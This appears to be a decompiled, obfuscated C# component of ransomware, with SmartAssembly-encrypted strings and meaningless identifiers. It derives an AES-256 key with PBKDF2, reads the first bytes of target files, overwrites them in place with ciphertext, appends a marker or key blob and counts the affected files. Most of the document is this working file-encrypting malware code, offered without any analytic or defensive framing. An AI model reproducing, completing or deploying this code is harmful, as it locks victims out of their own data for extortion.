using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wawLLalyhHSFm;

public static class PywWzStJmnOP
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] SCrqszkvgt(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = socKqbmeqqKOO(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes socKqbmeqqKOO(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] qDPulRCUpTwRa(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (ufSaqXYLSvVxK.cAsAngUTSsddb == getString_0(107396882))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (ufSaqXYLSvVxK.YGBzDBzlDVGPdcyT)
			{
				try
				{
					File.AppendAllText(ufSaqXYLSvVxK.ZmxznfzcMXVgTR, getString_0(107386930) + string_0 + getString_0(107399121) + ex.Message + getString_0(107396681));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool eZPzeLHBKntVHTM(string eDBBwAsYeVCx, byte[] VfjTsBqJDSVT, byte[] EeTyBkmkZsu = null)
	{
		try
		{
			byte[] array = null;
			if (ufSaqXYLSvVxK.cAsAngUTSsddb == getString_0(107396882))
			{
				array = (ufSaqXYLSvVxK.TTTJwfHUqgyKmj ? Encoding.ASCII.GetBytes(ufSaqXYLSvVxK.hcAHXMuOvto(ufSaqXYLSvVxK.tvwWJjGBYOWepj) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399095)) + Convert.ToString(ufSaqXYLSvVxK.kituZbADEtf) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399095))) : Encoding.ASCII.GetBytes(ufSaqXYLSvVxK.hcAHXMuOvto(ufSaqXYLSvVxK.tvwWJjGBYOWepj) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399104)) + Convert.ToString(ufSaqXYLSvVxK.kituZbADEtf) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399104))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(eDBBwAsYeVCx, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(VfjTsBqJDSVT, 0, VfjTsBqJDSVT.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(eDBBwAsYeVCx, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!ufSaqXYLSvVxK.TTTJwfHUqgyKmj)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(EeTyBkmkZsu, 0, EeTyBkmkZsu.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (ufSaqXYLSvVxK.TTTJwfHUqgyKmj ? Encoding.ASCII.GetBytes(ufSaqXYLSvVxK.hcAHXMuOvto(ufSaqXYLSvVxK.tvwWJjGBYOWepj) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399095)) + Convert.ToString(ufSaqXYLSvVxK.kituZbADEtf) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399095))) : Encoding.ASCII.GetBytes(ufSaqXYLSvVxK.hcAHXMuOvto(ufSaqXYLSvVxK.tvwWJjGBYOWepj) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399104)) + Convert.ToString(ufSaqXYLSvVxK.kituZbADEtf) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399104))));
				FileStream fileStream2 = new FileStream(eDBBwAsYeVCx, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(VfjTsBqJDSVT, 0, VfjTsBqJDSVT.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(eDBBwAsYeVCx, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!ufSaqXYLSvVxK.TTTJwfHUqgyKmj)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(EeTyBkmkZsu, 0, EeTyBkmkZsu.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			ufSaqXYLSvVxK.OSqubFtEdkqhb++;
		}
		catch (Exception ex)
		{
			if (ufSaqXYLSvVxK.YGBzDBzlDVGPdcyT)
			{
				try
				{
					File.AppendAllText(ufSaqXYLSvVxK.ZmxznfzcMXVgTR, getString_0(107386930) + eDBBwAsYeVCx + getString_0(107399054) + ex.Message + getString_0(107396681));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (ufSaqXYLSvVxK.TTTJwfHUqgyKmj ? Encoding.ASCII.GetBytes(ufSaqXYLSvVxK.hcAHXMuOvto(ufSaqXYLSvVxK.tvwWJjGBYOWepj) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399095)) + Convert.ToString(ufSaqXYLSvVxK.kituZbADEtf) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399095))) : Encoding.ASCII.GetBytes(ufSaqXYLSvVxK.hcAHXMuOvto(ufSaqXYLSvVxK.tvwWJjGBYOWepj) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399104)) + Convert.ToString(ufSaqXYLSvVxK.kituZbADEtf) + ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399104))));
				FileStream fileStream4 = new FileStream(eDBBwAsYeVCx, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(VfjTsBqJDSVT, 0, VfjTsBqJDSVT.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(eDBBwAsYeVCx, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!ufSaqXYLSvVxK.TTTJwfHUqgyKmj)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(EeTyBkmkZsu, 0, EeTyBkmkZsu.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static PywWzStJmnOP()
	{
		Strings.CreateGetStringDelegate(typeof(PywWzStJmnOP));
	}
}
